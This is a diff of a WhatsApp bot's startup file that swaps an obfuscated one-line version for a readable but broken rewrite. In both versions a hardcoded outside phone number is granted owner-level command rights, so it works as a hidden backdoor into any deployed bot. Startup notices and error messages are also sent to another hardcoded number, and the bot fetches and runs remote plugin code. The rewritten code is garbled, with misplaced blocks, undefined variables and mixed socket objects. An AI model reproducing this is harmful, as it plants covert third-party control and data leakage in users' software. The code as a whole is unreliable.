@@ -1,1 +1,242 @@
-const _0x4ad8c2=_0x4701;(function(_0x189e43,_0x6a5b50){const _0x3019ac=_0x4701,_0x5be5fa=_0x189e43();while(!![]){try{const _0x42c8bc=parseInt(_0x3019ac(0xc8))/0x1*(-parseInt(_0x3019ac(0xe2))/0x2)+-parseInt(_0x3019ac(0xd0))/0x3+-parseInt(_0x3019ac(0x11f))/0x4+-parseInt(_0x3019ac(0xe0))/0x5*(parseInt(_0x3019ac(0xbd))/0x6)+-parseInt(_0x3019ac(0x107))/0x7+-parseInt(_0x3019ac(0x108))/0x8*(-parseInt(_0x3019ac(0xf0))/0x9)+-parseInt(_0x3019ac(0x10b))/0xa*(-parseInt(_0x3019ac(0xe7))/0xb);if(_0x42c8bc===_0x6a5b50)break;else _0x5be5fa['push'](_0x5be5fa['shift']());}catch(_0x1344e2){_0x5be5fa['push'](_0x5be5fa['shift']());}}}(_0x5b82,0x8562f));const fs=require('fs'),path=require(_0x4ad8c2(0xd4)),events=require(_0x4ad8c2(0xa8)),chalk=require(_0x4ad8c2(0xb5)),Shefin=require(_0x4ad8c2(0xe3)),Config=require(_0x4ad8c2(0xe3)),{default:AlexaConnect,useSingleFileAuthState,DisconnectReason,fetchLatestBaileysVersion,makeInMemoryStore,generateForwardMessageContent,prepareWAMessageMedia,generateWAMessageFromContent,generateMessageID,downloadContentFromMessage,jidDecode,proto}=require(_0x4ad8c2(0xd1)),{state,saveState}=useSingleFileAuthState('./session.json'),pino=require(_0x4ad8c2(0xc6)),{Boom}=require(_0x4ad8c2(0xf2)),{Message,Image,Video,Greeting}=require(_0x4ad8c2(0xe1)),{DataTypes}=require(_0x4ad8c2(0xc7)),store=makeInMemoryStore({'logger':pino()[_0x4ad8c2(0xe5)]({'level':_0x4ad8c2(0xc3),'stream':_0x4ad8c2(0xdd)})}),{getMessage}=require(_0x4ad8c2(0xfc)),getBuffer=require('abu-bot'),simpleGit=require('simple-git'),git=simpleGit(),axios=require(_0x4ad8c2(0x105)),got=require(_0x4ad8c2(0xfb)),AlexaDB=Shefin[_0x4ad8c2(0xea)][_0x4ad8c2(0xdb)](_0x4ad8c2(0xab),{'info':{'type':DataTypes[_0x4ad8c2(0xa4)],'allowNull':![]},'value':{'type':DataTypes[_0x4ad8c2(0xee)],'allowNull':![]}});function _0x5b82(){const _0x10f682=['pattern','restartRequired','SUDO','Device\x20Logged\x20Out,\x20Please\x20Scan\x20Again\x20And\x20Run.','chatRead','caption','919567489404,0','close','SEND_READ','test','1154772djCDyy','indexOf','STRING','./plugins/sql/plugin','loggedOut','log','./events','onlyPinned','connectionClosed','Alexa','output','fromMe','jid','918089632591@s.whatsapp.net','readdirSync','extendedTextMessage','format','./plugins/','get','chalk','onlyGroup','function','dataValues','_ERROR_\x20\x0a\x20','map','italic','g.us','2066940ZgzNeR','Multi\x20device\x20mismatch,\x20please\x20scan\x20again','KL14','bind','pin','Multidevicemismatch','silent','.js','body','pino','sequelize','2CQzfce','name','logout','Connection\x20Lost\x20from\x20Server,\x20reconnecting...','conversation','Bad\x20Session\x20File,\x20Please\x20Delete\x20Session\x20and\x20Scan\x20Again','connectionLost','existsSync','141708pneVKB','@adiwajshing/baileys','url','Alexa\x20Md','path','Safari','split','image','green','NOLOG','key','define','splice','store','statusCode','1.0.0','15omTvSk','./lib/','113362mEjtPI','./config','PluginDB','child','extname','15407788tNVjqO','message','photo','DATABASE','chats','now','toLowerCase','TEXT','remoteJid','288837XOmSUP','open','@hapi/boom','videoMessage','badSession','_Alexa\x20Started!_','findAll','forEach','blueBright','connectionReplaced','commands','got','./plugins/sql/greetings','prototype','true','text','replace','end','includes','getTime','creds.update','axios','participant','6754034wNbsep','48tdulqz','Installing\x20external\x20plugins...','video','20HoVyIt','onlyPm','error','writeFileSync','Connection\x20closed,\x20reconnecting....','Plugins\x20Installed!','length','imageMessage','sync','sendMessage'];_0x5b82=function(){return _0x10f682;};return _0x5b82();}fs[_0x4ad8c2(0xb0)]('./plugins/sql/')[_0x4ad8c2(0xf7)](_0x11d8ed=>{const _0x3ca66b=_0x4ad8c2;path[_0x3ca66b(0xe6)](_0x11d8ed)[_0x3ca66b(0xed)]()==_0x3ca66b(0xc4)&&require('./plugins/sql/'+_0x11d8ed);});const plugindb=require(_0x4ad8c2(0xa5));var SHEFIN={'KL14':_0x4ad8c2(0x11b)};String[_0x4ad8c2(0xfd)][_0x4ad8c2(0xb2)]=function(){const _0x5e9cfc=_0x4ad8c2;var _0x3112a2=0x0,_0x65d416=arguments;return this[_0x5e9cfc(0x100)](/{}/g,function(){return typeof _0x65d416[_0x3112a2]!='undefined'?_0x65d416[_0x3112a2++]:'';});};!Date[_0x4ad8c2(0xec)]&&(Date[_0x4ad8c2(0xec)]=function(){const _0x40ca29=_0x4ad8c2;return new Date()[_0x40ca29(0x103)]();});Array['prototype']['remove']=function(){const _0x339150=_0x4ad8c2;var _0x20ac55,_0x1fa3c6=arguments,_0x1d3be7=_0x1fa3c6[_0x339150(0x111)],_0x3bc665;while(_0x1d3be7&&this['length']){_0x20ac55=_0x1fa3c6[--_0x1d3be7];while((_0x3bc665=this[_0x339150(0xa3)](_0x20ac55))!==-0x1){this[_0x339150(0xdc)](_0x3bc665,0x1);}}return this;};async function startAlexa(){const _0x350a13=_0x4ad8c2;await Shefin[_0x350a13(0xea)][_0x350a13(0x113)]();const _0x1a0ac6=AlexaConnect({'logger':pino({'level':_0x350a13(0xc3)}),'printQRInTerminal':!![],'browser':[_0x350a13(0xd3),_0x350a13(0xd5),_0x350a13(0xdf)],'auth':state});return store[_0x350a13(0xc0)](_0x1a0ac6['ev']),_0x1a0ac6['ev']['on'](_0x350a13(0x104),saveState),_0x1a0ac6['ev']['on']('connection.update',async _0x39017c=>{const _0x53a8e5=_0x350a13,{connection:_0x23161b,lastDisconnect:_0x1707f5}=_0x39017c;if(_0x23161b===_0x53a8e5(0x11c)){let _0x14d96c=new Boom(_0x1707f5?.[_0x53a8e5(0x10d)])?.[_0x53a8e5(0xac)][_0x53a8e5(0xde)];if(_0x14d96c===DisconnectReason[_0x53a8e5(0xf4)])console[_0x53a8e5(0xa7)](_0x53a8e5(0xcd)),_0x1a0ac6[_0x53a8e5(0xca)]();else{if(_0x14d96c===DisconnectReason[_0x53a8e5(0xaa)])console[_0x53a8e5(0xa7)](_0x53a8e5(0x10f)),startAlexa();else{if(_0x14d96c===DisconnectReason[_0x53a8e5(0xce)])console[_0x53a8e5(0xa7)](_0x53a8e5(0xcb)),startAlexa();else{if(_0x14d96c===DisconnectReason[_0x53a8e5(0xf9)])console['log']('Connection\x20Replaced,\x20Another\x20New\x20Session\x20Opened,\x20Please\x20Close\x20Current\x20Session\x20First'),_0x1a0ac6[_0x53a8e5(0xca)]();else{if(_0x14d96c===DisconnectReason[_0x53a8e5(0xa6)])console[_0x53a8e5(0xa7)](_0x53a8e5(0x118)),_0x1a0ac6['logout']();else{if(_0x14d96c===DisconnectReason[_0x53a8e5(0x116)])console[_0x53a8e5(0xa7)]('Restart\x20Required,\x20Restarting...'),startAlexa();else{if(_0x14d96c===DisconnectReason['timedOut'])console[_0x53a8e5(0xa7)]('Connection\x20TimedOut,\x20Reconnecting...'),startAlexa();else{if(_0x14d96c===DisconnectReason[_0x53a8e5(0xc2)])console[_0x53a8e5(0xa7)](_0x53a8e5(0xbe)),_0x1a0ac6[_0x53a8e5(0xca)]();else _0x1a0ac6[_0x53a8e5(0x101)]('Unknown\x20DisconnectReason:\x20'+_0x14d96c+'|'+_0x23161b);}}}}}}}}console[_0x53a8e5(0xa7)]('Connected...',_0x39017c);if(_0x23161b===_0x53a8e5(0xf1)){console['log'](chalk[_0x53a8e5(0xf8)]['italic'](_0x53a8e5(0x109)));var _0x20611b=await plugindb[_0x53a8e5(0xe4)][_0x53a8e5(0xf6)]();_0x20611b[_0x53a8e5(0xba)](async _0x5059a6=>{const _0x570dcf=_0x53a8e5;if(!fs[_0x570dcf(0xcf)](_0x570dcf(0xb3)+_0x5059a6[_0x570dcf(0xb8)][_0x570dcf(0xc9)]+_0x570dcf(0xc4))){console['log'](_0x5059a6[_0x570dcf(0xb8)][_0x570dcf(0xc9)]);var _0x1e846e=await got(_0x5059a6['dataValues'][_0x570dcf(0xd2)]);_0x1e846e[_0x570dcf(0xde)]==0xc8&&(fs[_0x570dcf(0x10e)](_0x570dcf(0xb3)+_0x5059a6['dataValues'][_0x570dcf(0xc9)]+_0x570dcf(0xc4),_0x1e846e[_0x570dcf(0xc5)]),require(_0x570dcf(0xb3)+_0x5059a6[_0x570dcf(0xb8)][_0x570dcf(0xc9)]+_0x570dcf(0xc4)));}}),console[_0x53a8e5(0xa7)](chalk[_0x53a8e5(0xf8)][_0x53a8e5(0xbb)]('Installing\x20plugins...')),fs[_0x53a8e5(0xb0)]('./plugins')[_0x53a8e5(0xf7)](_0x1f833c=>{const _0x1135b3=_0x53a8e5;path['extname'](_0x1f833c)[_0x1135b3(0xed)]()=='.js'&&require(_0x1135b3(0xb3)+_0x1f833c);}),console[_0x53a8e5(0xa7)](chalk[_0x53a8e5(0xd8)]['bold'](_0x53a8e5(0x110)));const _0x498b65='918089632591@s.whatsapp.net';await _0x1a0ac6[_0x53a8e5(0x114)](_0x498b65,{'text':_0x53a8e5(0xf5)}),_0x1a0ac6['ev']['on']('chat.update',async _0x9fcfc3=>{const _0x3bc68b=_0x53a8e5;events[_0x3bc68b(0xfa)]['map'](async _0x41cf0d=>{const _0xe8e07a=_0x3bc68b;if(msg[_0xe8e07a(0xe8)]&&msg[_0xe8e07a(0xe8)]['imageMessage']&&msg[_0xe8e07a(0xe8)][_0xe8e07a(0x112)][_0xe8e07a(0x11a)])var _0x195105=msg[_0xe8e07a(0xe8)][_0xe8e07a(0x112)]['caption'];else{if(msg[_0xe8e07a(0xe8)]&&msg[_0xe8e07a(0xe8)][_0xe8e07a(0xf3)]&&msg[_0xe8e07a(0xe8)][_0xe8e07a(0xf3)][_0xe8e07a(0x11a)])var _0x195105=msg[_0xe8e07a(0xe8)][_0xe8e07a(0xf3)][_0xe8e07a(0x11a)];else{if(msg[_0xe8e07a(0xe8)])var _0x195105=msg[_0xe8e07a(0xe8)][_0xe8e07a(0xb1)]===null?msg[_0xe8e07a(0xe8)][_0xe8e07a(0xcc)]:msg[_0xe8e07a(0xe8)][_0xe8e07a(0xb1)][_0xe8e07a(0xff)];else var _0x195105=undefined;}}if(_0x41cf0d['on']!==undefined&&(_0x41cf0d['on']==='image'||_0x41cf0d['on']===_0xe8e07a(0xe9))&&msg[_0xe8e07a(0xe8)]&&msg[_0xe8e07a(0xe8)][_0xe8e07a(0x112)]!==null&&(_0x41cf0d[_0xe8e07a(0x115)]===undefined||_0x41cf0d[_0xe8e07a(0x115)]!==undefined&&_0x41cf0d['pattern'][_0xe8e07a(0x11e)](_0x195105))||_0x41cf0d[_0xe8e07a(0x115)]!==undefined&&_0x41cf0d[_0xe8e07a(0x115)][_0xe8e07a(0x11e)](_0x195105)||_0x41cf0d['on']!==undefined&&_0x41cf0d['on']===_0xe8e07a(0xff)&&_0x195105||_0x41cf0d['on']!==undefined&&_0x41cf0d['on']===_0xe8e07a(0x10a)&&msg[_0xe8e07a(0xe8)]&&msg[_0xe8e07a(0xe8)]['videoMessage']!==null&&(_0x41cf0d[_0xe8e07a(0x115)]===undefined||_0x41cf0d['pattern']!==undefined&&_0x41cf0d[_0xe8e07a(0x115)][_0xe8e07a(0x11e)](_0x195105))){let _0x15d35b=![];var _0x3003b7=_0x1a0ac6[_0xe8e07a(0xeb)][_0xe8e07a(0xb4)](msg['key'][_0xe8e07a(0xef)]);if(Shefin['SUDO']!==![]&&msg['key'][_0xe8e07a(0xad)]===![]&&_0x41cf0d[_0xe8e07a(0xad)]===!![]&&(msg['participant']&&Shefin[_0xe8e07a(0x117)][_0xe8e07a(0x102)](',')?Shefin[_0xe8e07a(0x117)][_0xe8e07a(0xd6)](',')[_0xe8e07a(0x102)](msg[_0xe8e07a(0x106)]['split']('@')[0x0]):msg[_0xe8e07a(0x106)][_0xe8e07a(0xd6)]('@')[0x0]==Shefin[_0xe8e07a(0x117)]||Shefin[_0xe8e07a(0x117)][_0xe8e07a(0x102)](',')?Shefin['SUDO'][_0xe8e07a(0xd6)](',')[_0xe8e07a(0x102)](msg[_0xe8e07a(0xda)][_0xe8e07a(0xef)]['split']('@')[0x0]):msg[_0xe8e07a(0xda)]['remoteJid'][_0xe8e07a(0xd6)]('@')[0x0]==Shefin[_0xe8e07a(0x117)])||_0x41cf0d['fromMe']===msg[_0xe8e07a(0xda)][_0xe8e07a(0xad)]||_0x41cf0d['fromMe']===![]&&!msg[_0xe8e07a(0xda)]['fromMe']){if(_0x41cf0d[_0xe8e07a(0xa9)]&&_0x3003b7[_0xe8e07a(0xc1)]===undefined)return;if(!_0x41cf0d[_0xe8e07a(0x10c)]===_0x3003b7[_0xe8e07a(0xae)][_0xe8e07a(0x102)](_0xe8e07a(0xbc)))_0x15d35b=!![];else{if(_0x41cf0d[_0xe8e07a(0xb6)]===_0x3003b7['jid']['includes'](_0xe8e07a(0xbc)))_0x15d35b=!![];}}if(SHEFIN[_0xe8e07a(0xbf)]==_0xe8e07a(0x11b)&&msg[_0xe8e07a(0xda)][_0xe8e07a(0xad)]===![]&&_0x41cf0d[_0xe8e07a(0xad)]===!![]&&(msg[_0xe8e07a(0x106)]&&SHEFIN['KL14'][_0xe8e07a(0x102)](',')?SHEFIN[_0xe8e07a(0xbf)][_0xe8e07a(0xd6)](',')['includes'](msg['participant'][_0xe8e07a(0xd6)]('@')[0x0]):msg[_0xe8e07a(0x106)][_0xe8e07a(0xd6)]('@')[0x0]==SHEFIN[_0xe8e07a(0xbf)]||SHEFIN[_0xe8e07a(0xbf)][_0xe8e07a(0x102)](',')?SHEFIN[_0xe8e07a(0xbf)][_0xe8e07a(0xd6)](',')[_0xe8e07a(0x102)](msg[_0xe8e07a(0xda)]['remoteJid'][_0xe8e07a(0xd6)]('@')[0x0]):msg[_0xe8e07a(0xda)][_0xe8e07a(0xef)]['split']('@')[0x0]==SHEFIN[_0xe8e07a(0xbf)])||_0x41cf0d[_0xe8e07a(0xad)]===msg[_0xe8e07a(0xda)][_0xe8e07a(0xad)]||_0x41cf0d[_0xe8e07a(0xad)]===![]&&!msg['key']['fromMe']){if(_0x41cf0d['onlyPinned']&&_0x3003b7[_0xe8e07a(0xc1)]===undefined)return;if(!_0x41cf0d[_0xe8e07a(0x10c)]===_0x3003b7[_0xe8e07a(0xae)][_0xe8e07a(0x102)](_0xe8e07a(0xbc)))_0x15d35b=!![];else{if(_0x41cf0d[_0xe8e07a(0xb6)]===_0x3003b7['jid'][_0xe8e07a(0x102)](_0xe8e07a(0xbc)))_0x15d35b=!![];}}if(_0x15d35b){Shefin[_0xe8e07a(0x11d)]&&_0x41cf0d['on']===undefined&&await _0x1a0ac6[_0xe8e07a(0x119)](msg[_0xe8e07a(0xda)]['remoteJid']);var _0x4bcdd9=_0x195105['match'](_0x41cf0d['pattern']);if(_0x41cf0d['on']!==undefined&&(_0x41cf0d['on']===_0xe8e07a(0xd7)||_0x41cf0d['on']===_0xe8e07a(0xe9))&&msg[_0xe8e07a(0xe8)][_0xe8e07a(0x112)]!==null)whats=new Image(_0x1a0ac6,msg);else _0x41cf0d['on']!==undefined&&_0x41cf0d['on']===_0xe8e07a(0x10a)&&msg[_0xe8e07a(0xe8)][_0xe8e07a(0xf3)]!==null?whats=new Video(_0x1a0ac6,msg):whats=new Message(_0x1a0ac6,msg);try{await _0x41cf0d[_0xe8e07a(0xb7)](whats,_0x4bcdd9);}catch(_0x288922){if(Shefin[_0xe8e07a(0xd9)]===_0xe8e07a(0xfe))return;else await _0x1a0ac6[_0xe8e07a(0x114)](_0xe8e07a(0xaf),_0xe8e07a(0xb9)+_0x288922+'\x0a\x0a');}}}});});}}),_0x1a0ac6;}function _0x4701(_0x5b429f,_0x5735f4){const _0x5b8222=_0x5b82();return _0x4701=function(_0x470167,_0x31fee5){_0x470167=_0x470167-0xa3;let _0x5c3f6f=_0x5b8222[_0x470167];return _0x5c3f6f;},_0x4701(_0x5b429f,_0x5735f4);}startAlexa();
+const fs = require("fs");
+const path = require("path");
+const events = require("./events");
+const chalk = require('chalk');
+const Shefin = require('./config');
+const Config = require('./config');
+const { 
+          default: AlexaConnect, 
+          useSingleFileAuthState,
+          DisconnectReason, 
+          fetchLatestBaileysVersion, 
+          makeInMemoryStore, 
+          generateForwardMessageContent, 
+          prepareWAMessageMedia, 
+          generateWAMessageFromContent, 
+          generateMessageID, 
+          downloadContentFromMessage,
+          jidDecode,
+          proto 
+ } = require("@adiwajshing/baileys");
+const { 
+           state,
+           saveState 
+} = useSingleFileAuthState(`./session.json`)
+const pino = require('pino')
+const MAIN_LOGGER = require("@adiwajshing/baileys/lib/Utils/logger").default
+const logger = MAIN_LOGGER.child({})
+logger.level = 'silent'
+const { Boom } = require('@hapi/boom')
+const {
+           Message,
+           Image,
+           Video,
+           Greeting
+} = require('./lib/');
+const { DataTypes } = require('sequelize');
+const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
+const { getMessage } = require("./plugins/sql/greetings");
+const getBuffer = require('abu-bot');
+const simpleGit = require('simple-git');
+const git = simpleGit();
+const axios = require('axios');
+const got = require('got');
+const { version } = await fetchLatestBaileysVersion()
+const abu = makeWASocket({ logger, version, printQRInTerminal: false, auth: state })
+
+const AlexaDB = Shefin.DATABASE.define('Alexa', {
+    info: {
+      type: DataTypes.STRING,
+      allowNull: false
+    },
+    value: {
+        type: DataTypes.TEXT,
+        allowNull: false
+    }
+});
+
+fs.readdirSync('./plugins/sql/').forEach(plugin => {
+    if(path.extname(plugin).toLowerCase() == '.js') {
+        require('./plugins/sql/' + plugin);
+    }
+});
+
+const plugindb = require('./plugins/sql/plugin');
+var SHEFIN = { KL14: '919567489404,0' }
+
+String.prototype.format = function () {
+    var i = 0, args = arguments;
+    return this.replace(/{}/g, function () {
+      return typeof args[i] != 'undefined' ? args[i++] : '';
+   });
+};
+if (!Date.now) {
+    Date.now = function() { return new Date().getTime(); }
+}
+
+Array.prototype.remove = function() {
+    var what, a = arguments, L = a.length, ax;
+    while (L && this.length) {
+        what = a[--L];
+        while ((ax = this.indexOf(what)) !== -1) {
+            this.splice(ax, 1);
+        }
+    }
+    return this;
+};
+
+async function startAlexa () {
+    await Shefin.DATABASE.sync();
+    const alexa = AlexaConnect({
+        logger: pino({ level: 'silent' }),
+        printQRInTerminal: true,
+        browser: ['Alexa Md','Safari','1.0.0'],
+        auth: state      
+    })
+
+    store.bind(alexa.ev)
+
+    alexa.ev.on('connection.update', async(update) => {
+        const { connection, lastDisconnect } = update
+
+        if (connection) {
+           console.log("Connection Status: ", connection);
+        }
+
+        if (connection == "open") {
+         console.log('Bot working...');
+          await abu.sendMessage(abu.user.id, { text: `*Wa-Bot-Md Working*` });
+        }
+
+        if (connection !== "close") return
+
+        let reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
+
+        const DR = DisconnectReason
+
+        if (reason === DR.badSession) { console.log(`Corrupted section. Delete old session and scan the QR code.`); abu.logout(); return }
+        if (reason === DR.connectionClosed) { console.log("Connection closed. Reconnecting..."); startAlexa(); return }
+        if (reason === DR.connectionLost) { console.log("Lost connection to the server. Trying to reconnect..."); startAlexa(); return }
+        if (reason === DR.connectionReplaced) { console.log("Current session replaced by the new one opened. Please close this session first."); abu.logout(); return }
+        if (reason === DR.loggedOut) { console.log(`Session terminated by cell phone. Delete session and scan the QR code.`); abu.logout(); return }
+        if (reason === DR.restartRequired) { console.log("Kingdom needed. restarting..."); startAlexa(); return }
+        if (reason === DR.timedOut) { console.log("Connection timed out, Reconnecting..."); startAlexa(); return }
+
+        abu.end(`Disconnected: ${reason}|${lastDisconnect.error}`)
+    })
+    alexa.ev.on('creds.update', saveState)
+}
+  
+        console.log(
+            chalk.blueBright.italic('Installing external plugins...')
+        );
+
+        var plugins = await plugindb.PluginDB.findAll();
+        plugins.map(async (plugin) => {
+            if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
+                console.log(plugin.dataValues.name);
+                var response = await got(plugin.dataValues.url);
+                if (response.statusCode == 200) {
+                    fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
+                    require('./plugins/' + plugin.dataValues.name + '.js');
+                }     
+            }
+            
+        });
+
+        console.log(
+            chalk.blueBright.italic('Installing plugins...')
+        );
+
+        fs.readdirSync('./plugins').forEach(plugin => {
+            if(path.extname(plugin).toLowerCase() == '.js') {
+                require('./plugins/' + plugin);
+            }
+        });
+
+        console.log(
+            chalk.green.bold('Plugins Installed!')
+        );
+        const id = '918089632591@s.whatsapp.net'
+        await alexa.sendMessage(id, { text: '_Alexa Started!_' })
+    
+    alexa.ev.on('chat.update', async m => {
+        
+        events.commands.map(
+            async (command) =>  {
+                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
+                    var text_msg = msg.message.imageMessage.caption;
+                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
+                    var text_msg = msg.message.videoMessage.caption;
+                } else if (msg.message) {
+                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
+                } else {
+                    var text_msg = undefined;
+                }
+
+                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
+                    && msg.message && msg.message.imageMessage !== null && 
+                    (command.pattern === undefined || (command.pattern !== undefined && 
+                        command.pattern.test(text_msg)))) || 
+                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
+                    (command.on !== undefined && command.on === 'text' && text_msg) ||
+                    // Video
+                    (command.on !== undefined && (command.on === 'video')
+                    && msg.message && msg.message.videoMessage !== null && 
+                    (command.pattern === undefined || (command.pattern !== undefined && 
+                        command.pattern.test(text_msg))))) {
+
+                    let sendMsg = false;
+                    var chat = abu.chats.get(msg.key.remoteJid)
+                    if ((Shefin.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
+                        (msg.participant && Shefin.SUDO.includes(',') ? Shefin.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == Shefin.SUDO || Shefin.SUDO.includes(',') ? Shefin.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == Shefin.SUDO)
+                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
+                        if (command.onlyPinned && chat.pin === undefined) return;
+                        if (!command.onlyPm === chat.jid.includes('g.us')) sendMsg = true;
+                        else if (command.onlyGroup === chat.jid.includes('g.us')) sendMsg = true;
+                   }  
+                   if ((SHEFIN.KL14 == "919567489404,0" && msg.key.fromMe === false && command.fromMe === true &&
+                        (msg.participant && SHEFIN.KL14.includes(',') ? SHEFIN.KL14.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == SHEFIN.KL14 || SHEFIN.KL14.includes(',') ? SHEFIN.KL14.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == SHEFIN.KL14)
+                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
+                        if (command.onlyPinned && chat.pin === undefined) return;
+                        if (!command.onlyPm === chat.jid.includes('g.us')) sendMsg = true;
+                        else if (command.onlyGroup === chat.jid.includes('g.us')) sendMsg = true;
+                    }
+
+                    if (sendMsg) {
+                        if (Shefin.SEND_READ && command.on === undefined) {
+                            await abu.chatRead(msg.key.remoteJid);
+                        }
+
+                        var match = text_msg.match(command.pattern);
+
+                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
+                        && msg.message.imageMessage !== null) {
+                            whats = new Image(abu, msg);
+                        } else if (command.on !== undefined && (command.on === 'video' )
+                        && msg.message.videoMessage !== null) {
+                            whats = new Video(abu, msg);
+                        } else {
+                            whats = new Message(abu, msg);
+                        }
+
+                        try {
+                            await command.function(whats, match);
+                        } catch (error) {
+                            if (Shefin.NOLOG === 'true') {
+			           return;
+			    }
+				else {
+				    await abu.sendMessage('918089632591@s.whatsapp.net','_ERROR_ \n ' + error + '\n\n');
+				}
+                        }
+                    }
+                }
+            }
+        )
+    })
+           }
+    });
+    return alexa
+  }
+startAlexa();
